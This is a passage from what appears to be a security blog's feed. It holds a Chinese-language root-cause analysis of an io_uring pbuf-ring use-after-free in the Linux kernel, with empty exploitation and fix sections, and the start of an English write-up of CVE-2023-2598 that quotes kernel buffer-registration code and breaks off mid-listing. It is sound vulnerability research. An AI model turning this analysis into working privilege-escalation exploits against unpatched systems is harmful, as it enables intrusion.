class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在确定用户以<code>mmap</code>方式映射内存后，通过<code>__get_free_pages</code>获得内存页，分配了复合页。得到的结构如下图所示：<br>![[Pasted image 20250819120627.png]]</p><h5 id="内存清理"><a href="#内存清理" class="headerlink" title="内存清理"></a>内存清理</h5><p>有内存的创建，就会有内存的清理，对应<code>opcode</code>为<code>IORING_UNREGISTER_PBUF_RING</code>，在如下函数中操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_unregister_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">reg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="hljs-keyword">sizeof</span>(reg)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (reg.resv[<span class="hljs-number">0</span>] || reg.resv[<span class="hljs-number">1</span>] || reg.resv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg.flags)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>bl = io_buffer_get_list(ctx, reg.bgid);<br><span class="hljs-keyword">if</span> (!bl)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-keyword">if</span> (!bl-&gt;is_mapped)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>__io_remove_buffers(ctx, bl, <span class="hljs-number">-1U</span>);<br><span class="hljs-keyword">if</span> (bl-&gt;bgid &gt;= BGID_ARRAY) &#123;<br>xa_erase(&amp;ctx-&gt;io_bl_xa, bl-&gt;bgid);<br>kfree(bl);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数的核心逻辑是：</p><ul><li>首先将缓冲区从用户缓冲区复制到内核，然后对其参数做一些检查。</li><li>随后从刚刚拷贝得到的内容，通过<code>io_buffer_get_list</code>得到对应的<code>io_buffer_list</code>（缓冲区列表）</li><li>然后再根据这个列表，调用<code>__io_remove_buffers</code>函数对缓冲区进行清理。<br>接着看这个函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __io_remove_buffers(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx,<br>       <span class="hljs-keyword">struct</span> io_buffer_list *bl, <span class="hljs-type">unsigned</span> nbufs)<br>&#123;<br><span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* shouldn&#x27;t happen */</span><br><span class="hljs-keyword">if</span> (!nbufs)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (bl-&gt;is_mapped) &#123;<br>i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;<br><span class="hljs-keyword">if</span> (bl-&gt;is_mmap) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-comment">// 把 `bl-&gt;buf_ring` 的虚拟页面转换成真实的物理页面</span><br>page = virt_to_head_page(bl-&gt;buf_ring);<br><span class="hljs-comment">// 页面引用计数剪一，如果引用计数为0，则free掉该页面</span><br><span class="hljs-keyword">if</span> (put_page_testzero(page))<br>free_compound_page(page);<br><span class="hljs-comment">// 将`buf_list`的缓冲环和mmap标志清空</span><br>bl-&gt;buf_ring = <span class="hljs-literal">NULL</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (bl-&gt;buf_nr_pages) &#123;<br><span class="hljs-type">int</span> j;<br><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; bl-&gt;buf_nr_pages; j++)<br>unpin_user_page(bl-&gt;buf_pages[j]);<br>kvfree(bl-&gt;buf_pages);<br>bl-&gt;buf_pages = <span class="hljs-literal">NULL</span>;<br>bl-&gt;buf_nr_pages = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* make sure it&#x27;s seen as empty */</span><br>INIT_LIST_HEAD(&amp;bl-&gt;buf_list);<br>bl-&gt;is_mapped = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-comment">/* protects io_buffers_cache */</span><br>lockdep_assert_held(&amp;ctx-&gt;uring_lock);<br><br><span class="hljs-keyword">while</span> (!list_empty(&amp;bl-&gt;buf_list)) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer</span> *<span class="hljs-title">nxt</span>;</span><br><br>nxt = list_first_entry(&amp;bl-&gt;buf_list, <span class="hljs-keyword">struct</span> io_buffer, <span class="hljs-built_in">list</span>);<br>list_move(&amp;nxt-&gt;<span class="hljs-built_in">list</span>, &amp;ctx-&gt;io_buffers_cache);<br><span class="hljs-keyword">if</span> (++i == nbufs)<br><span class="hljs-keyword">return</span> i;<br>cond_resched();<br>&#125;<br><br><span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于我们现在只考虑<code>mmap</code>的情况，所以一定会进入<code>if</code>代码块。对<code>bl-&gt;ring</code>调用了函数<code>virt_to_head_page</code>，将虚拟地址换成真实页面（复合页面）（用了函数<code>virt_to_page</code>)，并且得到其首页地址（<code>compound_head_fast</code>)。页面引用计数剪一。如果引用计数为0，直接用<code>free_compound_page</code>释放。</p><p>这里会将<code>bl-&gt;buf_ring</code>和<code>bl-&gt;im_mmap</code>直接置空，但是用户对该”页”仍然拥有mmap的能力，即还能够对该页面进行读&#x2F;写。这就是我们在<code>mmap</code>里讲到：<code>remap_pfn_range()</code>后释放内存页，但没有去掉用户对该页面的<code>mmap</code>能力导致的<code>UAF</code>。<br>s</p><h5 id="io-uring-mmap"><a href="#io-uring-mmap" class="headerlink" title="io_uring_mmap()"></a><code>io_uring_mmap()</code></h5><p>上面的原理搞清楚，但是<code>mmap</code>调用了<code>remap_pfn_range()</code>了嘛？我们接下来具体看一下用户是如何对分配到的页（<code>pbuf</code>缓冲区）进行读写的：</p><p><code>io_uring</code>为我们提供了一个非常方便的函数：<code>io_uring_mmap()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __cold <span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-type">size_t</span> sz = vma-&gt;vm_end - vma-&gt;vm_start;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn;<br><span class="hljs-type">void</span> *ptr;<br><br>ptr = io_uring_validate_mmap_request(file, vma-&gt;vm_pgoff, sz);<br><span class="hljs-keyword">if</span> (IS_ERR(ptr))<br><span class="hljs-keyword">return</span> PTR_ERR(ptr);<br><br>pfn = virt_to_phys(ptr) &gt;&gt; PAGE_SHIFT;<br><span class="hljs-keyword">return</span> remap_pfn_range(vma, vma-&gt;vm_start, pfn, sz, vma-&gt;vm_page_prot);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>io_uring_validate_mmap_request()</code>这个函数完成了什么工作？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">io_uring_validate_mmap_request</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">    <span class="hljs-type">loff_t</span> pgoff, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_ring_ctx</span> *<span class="hljs-title">ctx</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> offset = pgoff &lt;&lt; PAGE_SHIFT;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr;<br><br><span class="hljs-keyword">switch</span> (offset &amp; IORING_OFF_MMAP_MASK) &#123;<br><span class="hljs-keyword">case</span> IORING_OFF_SQ_RING:<br><span class="hljs-keyword">case</span> IORING_OFF_CQ_RING:<br>ptr = ctx-&gt;rings;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_SQES:<br>ptr = ctx-&gt;sq_sqes;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_PBUF_RING: &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bgid;<br><br>bgid = (offset &amp; ~IORING_OFF_MMAP_MASK) &gt;&gt; IORING_OFF_PBUF_SHIFT;<br>mutex_lock(&amp;ctx-&gt;uring_lock);<br>ptr = io_pbuf_get_address(ctx, bgid);<br>mutex_unlock(&amp;ctx-&gt;uring_lock);<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br>&#125;<br><br>page = virt_to_head_page(ptr);<br><span class="hljs-keyword">if</span> (sz &gt; page_size(page))<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入 <code>case IORING_OFF_PBUF_RING</code>这个分支，可以看到返回了对应<code>bgid</code>的缓冲区地址。然后调了<code>io_pbuf_get_address</code>这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">io_pbuf_get_address</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bgid)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><span class="hljs-comment">// 根据io_uring上下文和bgid返回buf_ring的内核指针</span><br>bl = io_buffer_get_list(ctx, bgid);<br><span class="hljs-keyword">if</span> (!bl || !bl-&gt;is_mmap)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> bl-&gt;buf_ring;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数返回了<code>buf_ring</code>对应的内核指针，然后再返回看<code>io_uring_mmap</code>这个函数，取这个内核指针对应的物理连续页面的页头，然后调用<code>remap_pfn_range()</code>函数，将这段真实物理内存映射到用户的<code>vma</code>以供用户使用。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>因此整个触发逻辑可以总结为：</p><p>内核和用户共享一块<code>bl-&gt;buf_ring</code>对应的真实物理地址后，这块物理地址通过<code>io_uring_mmap</code>映射给用户，然后通过<code>io_unregister_pbuf_ring</code>将这块地址释放后，用户仍然拥有对这块真实物理地址的映射，即还能够进行读和写。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://arttnba3.cn/2025/02/22/CVE-0X0C-CVE-2024-0582/">arttnba3’s blog</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>io_uring</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-2598</title>
    <link href="/2025/08/20/CVE-2023-2598/"/>
    <url>/2025/08/20/CVE-2023-2598/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-2598"><a href="#CVE-2023-2598" class="headerlink" title="CVE-2023-2598"></a>CVE-2023-2598</h1><h2 id="what’s-io-uring"><a href="#what’s-io-uring" class="headerlink" title="what’s io_uring?"></a>what’s io_uring?</h2><p>​<code>io_uring</code> is a system call interface for Linux. It has supported almost all system call so far, not only <code>read()</code> and <code>write</code> initially. It enables an application to initiate system calls that can be performed asynchronously.</p><span id="more"></span><h2 id="Submission-and-Completion-Queues"><a href="#Submission-and-Completion-Queues" class="headerlink" title="Submission and Completion Queues"></a>Submission and Completion Queues</h2><p>At the core of every <code>io_uring</code> implementation sit two ring buffers - the submission queue(SQ) and the completion queue(CQ). Those ring buffers are shared between application and kernel.</p><p>We can get a submission queue entry(SQE) which describing a <code>syscall</code> you want to be performed by <code>io_uring_get_sqe</code> . The application then performs an <code>io_uring_enter</code> syscall to effectively tell the kernel that there is work waiting to be done in the submission queue.</p><p>After the kernel performs the operation it puts a <em>Completion Queue Entry (CQE)</em> into the completion queue ring buffer which can then be consumed by the application.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The function <code>io_sqe_buffer_register</code>  implements the mapping of virtual pages and physical addresses.</p><p>We should clarify some concepts first.</p><p>The application initiates a request for a buffer by <code>io_uring_register</code>. The call chain is as follows:</p><p><code>io_uring_register_buffers</code>-&gt;<code>io_uring_register</code>-&gt;<code>io_sqe_buffers_register</code></p><p>The source code of function <code>io_sqe_buffers_register</code> is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_sqe_buffers_register</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg,</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_args, u64 __user *tags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">last_hpage</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_rsrc_data</span> *<span class="hljs-title">data</span>;</span><br><span class="hljs-type">int</span> i, ret;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br><br>BUILD_BUG_ON(IORING_MAX_REG_BUFFERS &gt;= (<span class="hljs-number">1u</span> &lt;&lt; <span class="hljs-number">16</span>));<br><br><span class="hljs-keyword">if</span> (ctx-&gt;user_bufs)<br><span class="hljs-keyword">return</span> -EBUSY;<br><span class="hljs-keyword">if</span> (!nr_args || nr_args &gt; IORING_MAX_REG_BUFFERS)<br><span class="hljs-keyword">return</span> -EINVAL;<br>ret = io_rsrc_node_switch_start(ctx);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>ret = io_rsrc_data_alloc(ctx, io_rsrc_buf_put, tags, nr_args, &amp;data);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>ret = io_buffers_map_alloc(ctx, nr_args);<br><span class="hljs-keyword">if</span> (ret) &#123;<br>io_rsrc_data_free(data);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_args; i++, ctx-&gt;nr_user_bufs++) &#123;<br><span class="hljs-keyword">if</span> (arg) &#123;<br>ret = io_copy_iov(ctx, &amp;iov, arg, i);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>ret = io_buffer_validate(&amp;iov);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">memset</span>(&amp;iov, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(iov));<br>&#125;<br><br><span class="hljs-keyword">if</span> (!iov.iov_base &amp;&amp; *io_get_tag_slot(data, i)) &#123;<br>ret = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = io_sqe_buffer_register(ctx, &amp;iov, &amp;ctx-&gt;user_bufs[i],<br>     &amp;last_hpage);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>WARN_ON_ONCE(ctx-&gt;buf_data);<br><br>ctx-&gt;buf_data = data;<br><span class="hljs-keyword">if</span> (ret)<br>__io_sqe_buffers_unregister(ctx);<br><span class="hljs-keyword">else</span><br>io_rsrc_node_switch(ctx, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>In this function, we will run into <code>io_sqe_buffer_register</code>. And we will find a logical bug. The source code of function <code>io_sqe_buffer_register</code> is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_sqe_buffer_register</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-keyword">struct</span> iovec *iov,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> io_mapped_ubuf **pimu,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> page **last_hpage)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_mapped_ubuf</span> *<span class="hljs-title">imu</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> **<span class="hljs-title">pages</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> off;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">int</span> ret, nr_pages, i;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>*pimu = ctx-&gt;dummy_ubuf;<br><span class="hljs-keyword">if</span> (!iov-&gt;iov_base)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>ret = -ENOMEM;<br>pages = io_pin_pages((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base, iov-&gt;iov_len,<br>&amp;nr_pages);<br><span class="hljs-keyword">if</span> (IS_ERR(pages)) &#123;<br>ret = PTR_ERR(pages);<br>pages = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><br><span class="hljs-comment">/* If it&#x27;s a huge page, try to coalesce them into a single bvec entry */</span><br><span class="hljs-keyword">if</span> (nr_pages &gt; <span class="hljs-number">1</span>) &#123;<br>folio = page_folio(pages[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; nr_pages; i++) &#123;<br><span class="hljs-keyword">if</span> (page_folio(pages[i]) != folio) &#123;<br>folio = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (folio) &#123;<br>folio_put_refs(folio, nr_pages - <span class="hljs-number">1</span>);<br>nr_pages = <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br>imu = kvmalloc(struct_size(imu, bvec, nr_pages), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!imu)<br><span class="hljs-keyword">goto</span> done;<br><br>ret = io_buffer_account_pin(ctx, pages, nr_pages, imu, last_hpage);<br><span class="hljs-keyword">if</span> (ret) &#123;<br>unpin_user_pages(pages, nr_pages);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><br>off = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base &amp; ~PAGE_MASK;<br>size = iov-&gt;iov_len;<br><span class="hljs-comment">/* store original address for later verification */</span><br>imu-&gt;ubuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base;<br>imu-&gt;ubuf_end = imu-&gt;ubuf + iov-&gt;iov_len;<br>imu-&gt;nr_bvecs = nr_pages;<br>*pimu = imu;<br>ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (folio) &#123;<br>bvec_set_page(&amp;imu-&gt;bvec[<span class="hljs-number">0</span>], pages[<span class="hljs-number">0</span>], size, off);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++) &#123;<br><span class="hljs-type">size_t</span> vec_len;<br><br>vec_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, size, PAGE_SIZE - off);<br>bvec_set_page(&amp;imu-&gt;bvec[i], pages[i], vec_len, off);<br>off = <span class="hljs-number">0</span>;<br>size -= vec_len;<br>&#125;<br>done:<br><span class="hljs-keyword">if</span> (ret)<br>kvfree(imu);<br>kvfree(pages);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>Here I only mention a few important points.</p><ol><li><code>imu</code> means virtual address&#x2F;page.</li><li><code>page</code> means physical address&#x2F;page.</li><li><code>folio</code> means a lot of pages that are continues physically, preventing the situation that when a function is called and its parameter contains a page, but this page belongs to a continuous range of pages, but we are not sure whether to use the whole page or a single page.</li><li><code>struct iovec</code> -&gt;  just a structure that describes a buffer, with the start address of the buffer and its length. Nothing more.</li><li>An <code>io_mapped_ubuf</code> is a structure that holds the information about a buffer that has been registered to an <code>io_uring</code> instance.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_mapped_ubuf</span> &#123;</span><br>u64ubuf; <span class="hljs-comment">// the address at which the buffer starts</span><br>u64ubuf_end; <span class="hljs-comment">// the address at which it ends</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>nr_bvecs; <span class="hljs-comment">// how many bio_vec(s) are needed to address the buffer </span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>acct_pages;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bio_vec</span><span class="hljs-title">bvec</span>[];</span> <span class="hljs-comment">// array of bio_vec(s)</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>The member <code>bio_ver</code> is a <code>struct</code> like <code>iovec</code> but for physical memory.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-comment">/* If it&#x27;s a huge page, try to coalesce them into a single bvec entry 